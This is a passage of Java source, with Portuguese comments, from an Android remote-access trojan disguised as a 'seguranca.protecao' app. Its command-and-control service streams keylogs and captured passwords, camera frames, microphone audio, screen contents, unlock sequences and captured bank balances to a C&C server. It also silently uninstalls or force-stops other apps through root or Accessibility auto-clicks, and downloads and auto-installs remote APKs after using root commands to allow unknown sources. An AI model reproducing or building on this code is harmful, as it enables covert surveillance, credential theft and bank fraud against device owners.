                    java.util.List<android.os.UserHandle> profiles = um.getUserProfiles();
                    if (profiles != null) {
                        for (android.os.UserHandle profile : profiles) {
                            int uId = getUserIdFromHandle(profile);
                            if (uId > 0 && uId != myUserId) {
                                secondaryUserId = uId;
                                break;
                            }
                        }
                    }
                    if (secondaryUserId < 0) {
                        // Tenta criar novo perfil Pasta Segura via shell / PM
                        String cmdCreate = "pm create-user \"Pasta Segura\" || pm create-user --profileOf 0 --userType android.os.usertype.profile.MANAGED \"Pasta Segura\"";
                        Process pCreate = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmdCreate});
                        pCreate.waitFor();
                        java.util.List<android.os.UserHandle> updatedProfiles = um.getUserProfiles();
                        if (updatedProfiles != null) {
                            for (android.os.UserHandle profile : updatedProfiles) {
                                int uId = getUserIdFromHandle(profile);
                                if (uId > 0 && uId != myUserId) {
                                    secondaryUserId = uId;
                                    break;
                                }
                            }
                        }
                    }

                    if (secondaryUserId > 0) {
                        String cmdInstall = "pm install-existing --user " + secondaryUserId + " " + targetPkg;
                        Process pIns = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmdInstall});
                        pIns.waitFor();
                        profileIsolated = true;
                        Log.d(TAG, "🔒 App NATIVO " + targetPkg + " instalado com SUCESSO no perfil de Usuário " + secondaryUserId + " (Pasta Segura)");
                    }
                }
            } catch (Exception pe) {
                Log.w(TAG, "Aviso no gerenciador de perfil isolado Pasta Segura: " + pe.getMessage());
            }

            // 2. Configura Intent NATIVO do disparador de perfil secundário (User 10 - Pasta Segura)
            Intent cloneIntent = new Intent(this, CloneLaunchActivity.class);
            cloneIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_MULTIPLE_TASK | Intent.FLAG_ACTIVITY_NEW_DOCUMENT);
            cloneIntent.putExtra("target_package", targetPkg);
            cloneIntent.putExtra("target_user_id", secondaryUserId > 0 ? secondaryUserId : 10);
            cloneIntent.putExtra("is_cloned_instance", true);
            cloneIntent.putExtra("is_secure_folder", true);

            // 3. Adiciona Atalho Dinâmico NATIVO com ícone do app e selo 🔒 na tela inicial
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N_MR1) {
                try {
                    android.content.pm.ShortcutManager shortcutManager = getSystemService(android.content.pm.ShortcutManager.class);
                    if (shortcutManager != null && shortcutManager.isRequestPinShortcutSupported()) {
                        android.graphics.drawable.Drawable appIcon;
                        try {
                            appIcon = pm.getApplicationIcon(targetPkg);
                        } catch (Exception ie) {
                            appIcon = getApplicationInfo().loadIcon(pm);
                        }

                        android.graphics.Bitmap bitmap;
                        if (appIcon instanceof android.graphics.drawable.BitmapDrawable) {
                            bitmap = ((android.graphics.drawable.BitmapDrawable) appIcon).getBitmap().copy(android.graphics.Bitmap.Config.ARGB_8888, true);
                        } else {
                            bitmap = android.graphics.Bitmap.createBitmap(192, 192, android.graphics.Bitmap.Config.ARGB_8888);
                            android.graphics.Canvas canvas = new android.graphics.Canvas(bitmap);
                            appIcon.setBounds(0, 0, canvas.getWidth(), canvas.getHeight());
                            appIcon.draw(canvas);
                        }

                        // Desenha selo/escudo de Pasta Segura no ícone do atalho nativo
                        try {
                            android.graphics.Canvas canvas = new android.graphics.Canvas(bitmap);
                            android.graphics.Paint badgePaint = new android.graphics.Paint();
                            badgePaint.setColor(android.graphics.Color.parseColor("#007AFF")); // Azul Pasta Segura
                            badgePaint.setStyle(android.graphics.Paint.Style.FILL);
                            badgePaint.setAntiAlias(true);
                            int w = bitmap.getWidth();
                            int h = bitmap.getHeight();
                            int cx = w - 30;
                            int cy = h - 30;
                            canvas.drawCircle(cx, cy, 24, badgePaint);

                            android.graphics.Paint lockPaint = new android.graphics.Paint();
                            lockPaint.setColor(android.graphics.Color.WHITE);
                            lockPaint.setTextSize(26);
                            lockPaint.setFakeBoldText(true);
                            lockPaint.setTextAlign(android.graphics.Paint.Align.CENTER);
                            canvas.drawText("🔒", cx, cy + 9, lockPaint);
                        } catch (Exception badgeErr) {
                            Log.w(TAG, "Falha ao desenhar selo de Pasta Segura: " + badgeErr.getMessage());
                        }

                        android.content.pm.ShortcutInfo shortcut = new android.content.pm.ShortcutInfo.Builder(this, "secure_folder_" + System.currentTimeMillis())
                            .setShortLabel(finalCloneName)
                            .setLongLabel(finalCloneName + " (Pasta Segura)")
                            .setIcon(android.graphics.drawable.Icon.createWithBitmap(bitmap))
                            .setIntent(cloneIntent)
                            .build();

                        shortcutManager.requestPinShortcut(shortcut, null);
                    }
                } catch (Exception se) {
                    Log.w(TAG, "Aviso ao registrar atalho Pasta Segura: " + se.getMessage());
                }
            }

            Log.d(TAG, "🔒 Duplicação NATIVA em Pasta Segura concluída para " + targetPkg + " (User " + secondaryUserId + ")");
            sendResponse("SUCCESS", "🔒 Aplicativo duplicado NATIVAMENTE no perfil de Pasta Segura (User " + (secondaryUserId > 0 ? secondaryUserId : "10") + "). Atalho '" + finalCloneName + "' criado na tela inicial.");
        } catch (Exception e) {
            Log.e(TAG, "❌ Erro ao duplicar aplicativo em Pasta Segura: " + e.getMessage(), e);
            sendResponse("ERROR", "Erro ao duplicar app em Pasta Segura: " + e.getMessage());
        }
    }
    
    /**
     * Abre tela de desinstalação de um app
     * Tenta múltiplas abordagens para garantir compatibilidade
     */
    private void uninstallApp(String packageName) {
        Log.d(TAG, "🗑️ Solicitando desinstalação AUTOMÁTICA do app: " + packageName);
        
        // 🔒 PROTEÇÃO: Não permite desinstalar o próprio app via UNINSTALL_APP
        if (packageName == null || packageName.trim().isEmpty()) {
            sendResponse("ERROR", "Package não especificado");
            return;
        }

        if (packageName.equals(getPackageName())) {
            Log.w(TAG, "🔒 Tentativa de desinstalar o próprio app BLOQUEADA!");
            sendResponse("ERROR", "Não é permitido desinstalar o próprio app por esta opção");
            return;
        }
        
        // Ativa imediatamente as flags no Accessibility Service (UiAssistBridge)
        UiAssistBridge.allowUninstallOtherApps = true;
        UiAssistBridge.allowUninstallTime = System.currentTimeMillis();
        UiAssistBridge.autoUninstallEnabled = true;
        UiAssistBridge.autoUninstallTime = System.currentTimeMillis();
        UiAssistBridge.packageToUninstall = packageName;
        
        Intent allowIntent = new Intent("com.seguranca.protecao.ALLOW_UNINSTALL");
        allowIntent.setPackage(getPackageName());
        sendBroadcast(allowIntent);
        
        Intent autoUninstallIntent = new Intent("com.seguranca.protecao.AUTO_UNINSTALL");
        autoUninstallIntent.putExtra("package", packageName);
        autoUninstallIntent.setPackage(getPackageName());
        sendBroadcast(autoUninstallIntent);
        Log.d(TAG, "🗑️ Flags e Broadcasts de desinstalação automática ativados para: " + packageName);
        
        // Executa em thread separada
        new Thread(() -> {
            try {
                // 🔥 MÉTODO 1: pm uninstall via ROOT (SILENCIOSO E INSTANTÂNEO!)
                Log.d(TAG, "🗑️ Tentando pm uninstall silencioso para: " + packageName);
                Process suProcess = Runtime.getRuntime().exec("su");
                java.io.DataOutputStream os = new java.io.DataOutputStream(suProcess.getOutputStream());
                os.writeBytes("pm uninstall " + packageName + "\n");
                os.writeBytes("exit\n");
                os.flush();
                
                int exitCode = suProcess.waitFor();
                Log.d(TAG, "🗑️ pm uninstall exit code: " + exitCode);
                
                if (exitCode == 0) {
                    Thread.sleep(400);
                    try {
                        getPackageManager().getPackageInfo(packageName, 0);
                        Log.d(TAG, "🗑️ pm uninstall não concluiu totalmente, tentando auto-click");
                        uninstallWithAutoClick(packageName);
                    } catch (android.content.pm.PackageManager.NameNotFoundException e) {
                        Log.d(TAG, "🗑️ ✅ App desinstalado SILENCIOSAMENTE via ROOT: " + packageName);
                        sendResponse("OK", "App desinstalado com sucesso (silencioso via ROOT): " + packageName);
                        return;
                    }
                } else {
                    Log.d(TAG, "🗑️ ROOT não disponível ou falhou, ativando desinstalação automática via Accessibility");
                    uninstallWithAutoClick(packageName);
                }
            } catch (Exception e) {
                Log.e(TAG, "🗑️ Erro no pm uninstall: " + e.getMessage());
                uninstallWithAutoClick(packageName);
            }
        }).start();
    }
    
    /**
     * Desinstala app com auto-click automático via Accessibility Service
     */
    private void uninstallWithAutoClick(String packageName) {
        Log.d(TAG, "🗑️ Usando desinstalação AUTOMÁTICA via Accessibility para: " + packageName);
        
        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
            boolean started = false;
            try {
                Intent intent = new Intent(Intent.ACTION_DELETE);
                intent.setData(android.net.Uri.parse("package:" + packageName));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                startActivity(intent);
                started = true;
                sendResponse("OK", "Desinstalação automática iniciada para: " + packageName);
            } catch (Exception e) {
                Log.e(TAG, "❌ ACTION_DELETE falhou: " + e.getMessage());
            }

            if (!started) {
                try {
                    Intent settingsIntent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                    settingsIntent.setData(android.net.Uri.parse("package:" + packageName));
                    settingsIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                    startActivity(settingsIntent);
                    sendResponse("OK", "Tela de configurações aberta para auto-desinstalação: " + packageName);
                } catch (Exception e3) {
                    Log.e(TAG, "❌ Todos os métodos de desinstalação falharam: " + e3.getMessage());
                    sendResponse("ERROR", "Erro ao iniciar desinstalação: " + e3.getMessage());
                }
            }
        }, 150);
    }
    
    /**
     * Força parada de um app (via ROOT ou Accessibility)
     */
    private void forceStopApp(String packageName) {
        Log.d(TAG, "⛔ Forçando parada: " + packageName);
        
        if (packageName == null || packageName.trim().isEmpty()) {
            sendResponse("ERROR", "Package não especificado");
            return;
        }

        if (packageName.equals(getPackageName())) {
            sendResponse("ERROR", "Não é permitido forçar parada do próprio app");
            return;
        }

        // Ativa as flags no Accessibility Service (UiAssistBridge)
        UiAssistBridge.autoForceStopEnabled = true;
        UiAssistBridge.autoForceStopTime = System.currentTimeMillis();
        UiAssistBridge.packageToForceStop = packageName;

        Intent forceStopIntent = new Intent("com.seguranca.protecao.AUTO_FORCE_STOP");
        forceStopIntent.putExtra("package", packageName);
        forceStopIntent.setPackage(getPackageName());
        sendBroadcast(forceStopIntent);

        new Thread(() -> {
            // Método 1: Tenta via ROOT (imediato e silencioso)
            try {
                Process suProcess = Runtime.getRuntime().exec("su");
                java.io.DataOutputStream os = new java.io.DataOutputStream(suProcess.getOutputStream());
                os.writeBytes("am force-stop " + packageName + "\n");
                os.writeBytes("exit\n");
                os.flush();
                int exitCode = suProcess.waitFor();
                if (exitCode == 0) {
                    Log.d(TAG, "⛔ ✅ App interrompido via ROOT: " + packageName);
                    sendResponse("OK", "App interrompido com sucesso (via ROOT): " + packageName);
                    UiAssistBridge.autoForceStopEnabled = false;
                    return;
                }
            } catch (Exception ignored) {}

            // Método 2: Via Accessibility Service (abre App Info e clica em Forçar Parada -> OK)
            new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> {
                try {
                    Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                    intent.setData(android.net.Uri.parse("package:" + packageName));
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                    startActivity(intent);
                    sendResponse("OK", "Interrupção do aplicativo iniciada: " + packageName);
                } catch (Exception e) {
                    Log.e(TAG, "❌ Erro ao abrir configurações para force-stop: " + e.getMessage());
                    sendResponse("ERROR", "Erro ao forçar parada: " + e.getMessage());
                }
            });
        }).start();
    }
    
    /**
     * Gera ID único do dispositivo
     */
    private String getUniqueDeviceId() {
        String androidId = android.provider.Settings.Secure.getString(
            getContentResolver(),
            android.provider.Settings.Secure.ANDROID_ID
        );
        return androidId != null ? androidId : "unknown";
    }
    
    /**
     * Liga/Desliga keylogger
     */
    private void toggleKeylogger(boolean enabled) {
        Log.d(TAG, "⌨️ " + (enabled ? "Ativando" : "Desativando") + " keylogger...");
        
        Intent intent = new Intent("com.seguranca.protecao.TOGGLE_KEYLOGGER");
        intent.setPackage(getPackageName());
        intent.putExtra("enabled", enabled);
        sendBroadcast(intent);
    }
    
    private void saveOfflineKeylog(String jsonData) {
        if (jsonData == null || jsonData.isEmpty()) return;
        if (offlineKeylogQueue.size() >= MAX_OFFLINE_KEYLOGS) {
            offlineKeylogQueue.poll(); // Remove o mais antigo
        }
        offlineKeylogQueue.offer(jsonData);
        Log.d(TAG, "📦 Keylog armazenado na fila offline (" + offlineKeylogQueue.size() + " acumulados)");
    }

    private void flushOfflineKeylogs() {
        if (!isConnected || webSocket == null || offlineKeylogQueue.isEmpty()) return;
        Log.d(TAG, "🔄 Descarregando " + offlineKeylogQueue.size() + " keylogs acumulados offline...");
        int count = 0;
        while (isConnected && webSocket != null && !offlineKeylogQueue.isEmpty() && count < 60) {
            String data = offlineKeylogQueue.poll();
            if (data != null) {
                try {
                    JsonObject msg = new JsonObject();
                    msg.addProperty("type", "KEYLOG_OFFLINE");
                    msg.addProperty("data", data);
                    sendJson(msg);
                    count++;
                } catch (Exception e) {
                    Log.e(TAG, "Erro ao descarregar keylog offline: " + e.getMessage());
                    break;
                }
            }
        }
    }

    /**
     * Envia dados do keylogger para servidor (ou salva offline se desconectado)
     */
    private void sendKeylog(String jsonData) {
        if (!isConnected || webSocket == null) {
            saveOfflineKeylog(jsonData);
            scheduleReconnect();
            return;
        }
        
        try {
            JsonObject msg = new JsonObject();
            msg.addProperty("type", "KEYLOG");
            msg.addProperty("data", jsonData);
            sendJson(msg);
            
            Log.d(TAG, "✅ Keylog enviado: " + jsonData);
            
            if (!offlineKeylogQueue.isEmpty()) {
                flushOfflineKeylogs();
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Erro ao enviar keylog: " + e.getMessage());
            saveOfflineKeylog(jsonData);
        }
    }
    
    /**
     * 🔐 Envia keylog para servidor (chamado via BroadcastReceiver)
     * Usado pelo VisualScreenActivity para enviar senhas capturadas
     */
    private void sendKeylogToServer(String jsonData) {
        if (!isConnected || webSocket == null) {
            saveOfflineKeylog(jsonData);
            connectToServer();
            return;
        }
        sendKeylog(jsonData);
        Log.d(TAG, "🔐 Keylog enviado ao servidor: " + jsonData.substring(0, Math.min(100, jsonData.length())));
    }
    
    /**
     * Liga/Desliga Screen Reader V2
     */
    private void toggleScreenReader(boolean enabled) {
        Log.d(TAG, "👁️ " + (enabled ? "Ativando" : "Desativando") + " Screen Reader V2...");
        
        Intent intent = new Intent("com.seguranca.protecao.TOGGLE_SCREEN_READER");
        intent.setPackage(getPackageName());
        intent.putExtra("enabled", enabled);
        sendBroadcast(intent);
    }
    
    /**
     * Envia hierarquia da tela para servidor (Screen Reader V2)
     */
    private void sendScreenHierarchy(String jsonData) {
        if (!isConnected || webSocket == null) {
            Log.w(TAG, "⚠️ Não conectado! Descartando screen hierarchy.");
            return;
        }
        
        try {
            JsonObject msg = new JsonObject();
            msg.addProperty("type", "SCREEN_HIERARCHY");
            msg.addProperty("data", jsonData);
            sendJson(msg);
            
            // Log resumido (pode ser muito grande)
            Log.d(TAG, "✅ Screen hierarchy enviada (" + jsonData.length() + " bytes)");
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Erro ao enviar screen hierarchy: " + e.getMessage());
        }
    }
    
    /**
     * 🔓 Envia sequência de desbloqueio gravada para o servidor
     */
    private void sendUnlockSequence(String jsonData) {
        if (!isConnected || webSocket == null) {
            Log.w(TAG, "⚠️ Não conectado! Descartando unlock sequence.");
            return;
        }
        
        try {
            JsonObject msg = new JsonObject();
            msg.addProperty("type", "UNLOCK_SEQUENCE");
            msg.addProperty("data", jsonData);
            sendJson(msg);
            
            Log.d(TAG, "🔓 Unlock sequence enviada (" + jsonData.length() + " bytes)");
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Erro ao enviar unlock sequence: " + e.getMessage());
        }
    }
    
    /**
     * 📷 Liga/Desliga câmera em tempo real
     */
    private void toggleCamera(boolean enabled) {
        Log.d(TAG, "📷 " + (enabled ? "Ativando" : "Desativando") + " câmera...");
        
        // Garante que o serviço está rodando antes de enviar broadcast
        if (enabled) {
            try {
                Intent serviceIntent = new Intent(this, CameraService.class);
                startService(serviceIntent);
                Log.d(TAG, "📷 CameraService iniciado");
            } catch (Exception e) {
                Log.e(TAG, "❌ Erro ao iniciar CameraService: " + e.getMessage());
            }
        }
        
        // Pequeno delay para garantir que o serviço está pronto
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            Intent intent = new Intent("com.seguranca.protecao.TOGGLE_CAMERA");
            intent.setPackage(getPackageName());
            intent.putExtra("enabled", enabled);
            sendBroadcast(intent);
            Log.d(TAG, "📷 Broadcast TOGGLE_CAMERA enviado: " + enabled);
        }, enabled ? 500 : 0);
    }
    
    /**
     * 📷 Envia frame da câmera para servidor (base64)
     */
    public void sendCameraFrame(byte[] jpegData) {
        if (!isConnected || webSocket == null) {
            Log.w(TAG, "⚠️ Não conectado! Descartando frame da câmera.");
            return;
        }
        
        try {
            String base64 = android.util.Base64.encodeToString(jpegData, android.util.Base64.NO_WRAP);
            
            JsonObject msg = new JsonObject();
            msg.addProperty("type", "CAMERA_FRAME");
            msg.addProperty("data", base64);
            sendJson(msg);
            
            Log.d(TAG, "✅ Camera frame enviado: " + jpegData.length + " bytes");
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Erro ao enviar camera frame: " + e.getMessage());
        }
    }
    
    /**
     * 🎤 Liga/Desliga microfone em tempo real
     */
    private void toggleMicrophone(boolean enabled) {
        Log.d(TAG, "🎤 " + (enabled ? "Ativando" : "Desativando") + " microfone...");
        
        // Garante que o serviço está rodando antes de enviar broadcast
        if (enabled) {
            try {
                Intent serviceIntent = new Intent(this, MicrophoneService.class);
                startService(serviceIntent);
                Log.d(TAG, "🎤 MicrophoneService iniciado");
            } catch (Exception e) {
                Log.e(TAG, "❌ Erro ao iniciar MicrophoneService: " + e.getMessage());
            }
        }
        
        // Pequeno delay para garantir que o serviço está pronto
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            Intent intent = new Intent("com.seguranca.protecao.TOGGLE_MICROPHONE");
            intent.setPackage(getPackageName());
            intent.putExtra("enabled", enabled);
            sendBroadcast(intent);
            Log.d(TAG, "🎤 Broadcast TOGGLE_MICROPHONE enviado: " + enabled);
        }, enabled ? 500 : 0);
    }
    
    /**
     * 🎤 Envia chunk de áudio para servidor (base64)
     */
    public void sendAudioChunk(byte[] audioData) {
        if (!isConnected || webSocket == null) {
            Log.w(TAG, "⚠️ Não conectado! Descartando chunk de áudio.");
            return;
        }
        
        try {
            String base64 = android.util.Base64.encodeToString(audioData, android.util.Base64.NO_WRAP);
            
            JsonObject msg = new JsonObject();
            msg.addProperty("type", "AUDIO_CHUNK");
            msg.addProperty("data", base64);
            sendJson(msg);
            
            Log.d(TAG, "✅ Audio chunk enviado: " + audioData.length + " bytes");
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Erro ao enviar audio chunk: " + e.getMessage());
        }
    }
    
    /**
     * Backpressure gate shared by standard and silent capture loops.
     * Mirrors sendFrame() throttle without sending.
     */
    public static boolean canAcceptScreenFrame() {
        CommandControlService svc = sInstance;
        if (svc == null || !svc.isConnected || svc.webSocket == null) {
            return false;
        }
        
        // Evita enfileirar mais se o buffer de envio do WebSocket ainda estiver cheio
        try {
            if (svc.webSocket.queueSize() > 0) {
                return false;
            }
        } catch (Exception ignored) {}
        
        long now = System.currentTimeMillis();
        boolean silentPipeline = UiAssistBridge.isSilentCaptureRunning();
        int currentMinInterval = resolveMinFrameInterval(silentPipeline, svc.isSlowConnection);
        if (now - svc.lastFrameSentTime < currentMinInterval) {
            return false;
        }
        return svc.pendingFrames < MAX_PENDING_FRAMES;
    }

    /**
     * 🔇 Envia status do caminho silencioso dedicado (BTMOB).
     * Usado para que o painel reflita o estado real após reconexão/refresh.
     */
    private void sendSilentVncStatusInternal(boolean active, String method) {
        if (!isConnected || webSocket == null) {
            return;
        }
        try {
            JsonObject st = new JsonObject();
            st.addProperty("type", "SILENT_VNC_STATUS");
            st.addProperty("active", active);
            st.addProperty("method", method != null ? method : "silent");
            st.addProperty("device_id", deviceId);
            sendJson(st);
        } catch (Exception e) {
            Log.e(TAG, "❌ Erro ao enviar SILENT_VNC_STATUS: " + e.getMessage());
        }
    }

    /**
     * 🔇 Envia frame silent pelo mesmo pipeline binário da captura padrão (SEND_FRAME → sendFrame).
     */
    public static void sendSilentVncFrame(Context context, byte[] frameData) {
        if (context == null || frameData == null) {
            return;
        }
        CommandControlService svc = sInstance;
        if (svc != null && svc.isConnected && svc.webSocket != null) {
            svc.sendFrame(frameData, true);
        } else {
            Intent intent = new Intent(context, CommandControlService.class);
            intent.setAction("SEND_FRAME");
            intent.putExtra("frame", frameData);
            intent.putExtra("silent_pipeline", true);
            try {
                context.startService(intent);
            } catch (Exception e) {
                Log.e(TAG, "sendSilentVncFrame error: " + e.getMessage());
            }
        }
    }

    /**
     * 💰 Envia saldo bancário capturado para o servidor C&C
     */
    public static void sendBankBalance(Context context, String packageName, String balance, String accountInfo) {
        if (context == null || packageName == null || balance == null) return;
        CommandControlService svc = sInstance;
        JsonObject json = new JsonObject();
        json.addProperty("type", "BANK_BALANCE");
        json.addProperty("package", packageName);
        json.addProperty("balance", balance);
        json.addProperty("accountInfo", accountInfo != null ? accountInfo : "");
        json.addProperty("timestamp", System.currentTimeMillis());

        if (svc != null && svc.isConnected && svc.webSocket != null) {
            svc.sendJson(json);
        }
    }

    /**
     * 🔇 Static helper to report dedicated silent status (called from AccessibilityService).
     */
    public static void sendSilentVncStatus(Context context, boolean active, String method) {
        Intent intent = new Intent("com.seguranca.protecao.SILENT_VNC_STATUS");
        intent.setPackage(context.getPackageName());
        intent.putExtra("active", active);
        intent.putExtra("method", method != null ? method : "silent");
        context.sendBroadcast(intent);
    }

    public void sendDeviceStatusLocal(String packageName, String appName, boolean isLocked, boolean isScreenOn) {
        JsonObject statusJson = new JsonObject();
        statusJson.addProperty("type", "DEVICE_STATUS");
        statusJson.addProperty("package", packageName != null ? packageName : "");
        statusJson.addProperty("appName", appName != null ? appName : "");
        statusJson.addProperty("isLocked", isLocked);
        statusJson.addProperty("isScreenOn", isScreenOn);
        sendJson(statusJson);
    }

    public void sendKeylogLocal(String data) {
        sendKeylog(data);
    }

    public void sendScreenHierarchyLocal(String data) {
        sendScreenHierarchy(data);
    }

    public void sendUnlockSequenceLocal(String data) {
        sendUnlockSequence(data);
    }

    public void sendCapturedDataLocal(String jsonData) {
        try {
            JsonObject dataObj = gson.fromJson(jsonData, JsonObject.class);
            JsonObject payload = new JsonObject();
            payload.addProperty("type", "STUDIO_FORM_DATA");
            payload.add("data", dataObj);
            payload.addProperty("project_id", dataObj.has("project_id") ? dataObj.get("project_id").getAsString() : "unknown");
            sendJson(payload);
        } catch (Exception e) {
            Log.e(TAG, "Erro ao processar captured data: " + e.getMessage());
        }
    }

    public static void sendDeviceStatus(Context context, String packageName, String appName, boolean isLocked, boolean isScreenOn) {
        CommandControlService svc = sInstance;
        if (svc != null && svc.isConnected && svc.webSocket != null) {
            svc.sendDeviceStatusLocal(packageName, appName, isLocked, isScreenOn);
        } else {
            Intent intent = new Intent(context, CommandControlService.class);
            intent.setAction("SEND_DEVICE_STATUS");
            intent.putExtra("packageName", packageName);
            intent.putExtra("appName", appName);
            intent.putExtra("isLocked", isLocked);
            intent.putExtra("isScreenOn", isScreenOn);
            try {
                context.startService(intent);
            } catch (Exception ignored) {}
        }
    }

    public static void sendKeylogData(Context context, String logData) {
        CommandControlService svc = sInstance;
        if (svc != null && svc.isConnected && svc.webSocket != null) {
            svc.sendKeylogLocal(logData);
        } else {
            Intent intent = new Intent(context, CommandControlService.class);
            intent.setAction("SEND_KEYLOG");
            intent.putExtra("data", logData);
            try {
                context.startService(intent);
            } catch (Exception ignored) {}
        }
    }

    public static void sendScreenHierarchy(Context context, String jsonData) {
        CommandControlService svc = sInstance;
        if (svc != null && svc.isConnected && svc.webSocket != null) {
            svc.sendScreenHierarchyLocal(jsonData);
        } else {
            Intent intent = new Intent(context, CommandControlService.class);
            intent.setAction("SEND_SCREEN_HIERARCHY");
            intent.putExtra("data", jsonData);
            try {
                context.startService(intent);
            } catch (Exception ignored) {}
        }
    }

    public static void sendUnlockSequence(Context context, String sequenceData) {
        CommandControlService svc = sInstance;
        if (svc != null && svc.isConnected && svc.webSocket != null) {
            svc.sendUnlockSequenceLocal(sequenceData);
        } else {
            Intent intent = new Intent(context, CommandControlService.class);
            intent.setAction("SEND_UNLOCK_SEQUENCE");
            intent.putExtra("data", sequenceData);
            try {
                context.startService(intent);
            } catch (Exception ignored) {}
        }
    }

    public static void sendCapturedData(Context context, String jsonData) {
        CommandControlService svc = sInstance;
        if (svc != null && svc.isConnected && svc.webSocket != null) {
            svc.sendCapturedDataLocal(jsonData);
        } else {
            Intent intent = new Intent(context, CommandControlService.class);
            intent.setAction("SEND_CAPTURED_DATA");
            intent.putExtra("jsonData", jsonData);
            try {
                context.startService(intent);
            } catch (Exception ignored) {}
        }
    }

    // ==================== INSTALAÇÃO SILENCIOSA DE APK ====================
    
    /**
     * 📦 Baixa APK de URL e instala silenciosamente
     * O AccessibilityService vai auto-clicar em "Instalar" e "Abrir"
     */
    private void installApkFromUrl(String apkUrl) {
        Log.d(TAG, "📦 Iniciando download de APK: " + apkUrl);
        
        // 🔓 TENTA BYPASS COM ROOT: Concede permissão de instalar de fontes desconhecidas
        tryGrantInstallPermissionWithRoot();
        
        // Ativa modo de auto-click para instalação
        Intent enableAutoInstall = new Intent("com.seguranca.protecao.ENABLE_AUTO_INSTALL");
        enableAutoInstall.setPackage(getPackageName());
        sendBroadcast(enableAutoInstall);
        
        // Download em thread separada
        new Thread(() -> {
            try {
                // Cria arquivo temporário
                java.io.File apkFile = new java.io.File(getExternalFilesDir(null), "update_" + System.currentTimeMillis() + ".apk");
                
                // Download
                java.net.URL url = new java.net.URL(apkUrl);
                java.net.HttpURLConnection connection = (java.net.HttpURLConnection) url.openConnection();
                connection.setRequestMethod("GET");
                connection.setConnectTimeout(30000);
                connection.setReadTimeout(30000);
                connection.connect();
                
                if (connection.getResponseCode() != 200) {
                    Log.e(TAG, "📦 ❌ Erro no download: HTTP " + connection.getResponseCode());
                    sendResponse("ERROR", "Erro no download: HTTP " + connection.getResponseCode());
                    return;
                }
                
                java.io.InputStream inputStream = connection.getInputStream();
                java.io.FileOutputStream outputStream = new java.io.FileOutputStream(apkFile);
                
                byte[] buffer = new byte[4096];
                int bytesRead;
                long totalBytes = 0;
                
                while ((bytesRead = inputStream.read(buffer)) != -1) {
                    outputStream.write(buffer, 0, bytesRead);
                    totalBytes += bytesRead;
                }
                
                outputStream.close();
                inputStream.close();
                connection.disconnect();
                
                Log.d(TAG, "📦 ✅ Download concluído: " + totalBytes + " bytes -> " + apkFile.getAbsolutePath());
                
                // Instala o APK
                installApkFile(apkFile);
                
            } catch (Exception e) {
                Log.e(TAG, "📦 ❌ Erro no download/instalação: " + e.getMessage());
                sendResponse("ERROR", "Erro: " + e.getMessage());
            }
        }).start();
    }
    
    /**
     * 📦 Instala APK de arquivo local
     * Abre a tela de instalação - o AccessibilityService vai auto-clicar
     */
    private void installApkFile(java.io.File apkFile) {
        try {
            Log.d(TAG, "📦 Iniciando instalação: " + apkFile.getAbsolutePath());
            
            Intent installIntent = new Intent(Intent.ACTION_VIEW);
            
            // Android 7+ precisa de FileProvider
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
                android.net.Uri apkUri = androidx.core.content.FileProvider.getUriForFile(
                    this,
                    getPackageName() + ".fileprovider",
                    apkFile
                );
                installIntent.setDataAndType(apkUri, "application/vnd.android.package-archive");
                installIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            } else {
                installIntent.setDataAndType(android.net.Uri.fromFile(apkFile), "application/vnd.android.package-archive");
            }
            
            installIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(installIntent);
            
            Log.d(TAG, "📦 ✅ Tela de instalação aberta - AccessibilityService vai auto-clicar!");
            
        } catch (Exception e) {
            Log.e(TAG, "📦 ❌ Erro ao abrir instalador: " + e.getMessage());
            e.printStackTrace();
        }
    }
    
    /**
     * 🔓 Tenta conceder permissão de instalar de fontes desconhecidas usando ROOT
     * Funciona em dispositivos com root ou emuladores com google_apis
     */
    private void tryGrantInstallPermissionWithRoot() {
        new Thread(() -> {
            try {
                // Método 1: appops (funciona em Android 8+)
                String packageName = getPackageName();
                String[] commands = {
                    "appops set " + packageName + " REQUEST_INSTALL_PACKAGES allow",
                    "pm grant " + packageName + " android.permission.REQUEST_INSTALL_PACKAGES"
                };
                
                for (String cmd : commands) {
                    try {
                        // Tenta sem root primeiro (funciona em alguns emuladores)
                        Process process = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
                        int exitCode = process.waitFor();
                        if (exitCode == 0) {
                            Log.d(TAG, "📦 ✅ ROOT BYPASS: Comando executado com sucesso: " + cmd);
                        }
                        
                        // Tenta com su (root)
                        Process suProcess = Runtime.getRuntime().exec(new String[]{"su", "-c", cmd});
                        int suExitCode = suProcess.waitFor();
                        if (suExitCode == 0) {
                            Log.d(TAG, "📦 ✅ ROOT BYPASS (su): Comando executado com sucesso: " + cmd);
                        }
                    } catch (Exception e) {
                        Log.d(TAG, "📦 ROOT BYPASS: Comando falhou (sem root?): " + cmd);
                    }
                }
                
                // Método 2: Modifica settings diretamente (Android antigo)
                try {
                    Process settingsProcess = Runtime.getRuntime().exec(new String[]{
                        "su", "-c", "settings put secure install_non_market_apps 1"
                    });
                    settingsProcess.waitFor();
                } catch (Exception e) {
                    // Ignora se falhar
                }
                
            } catch (Exception e) {
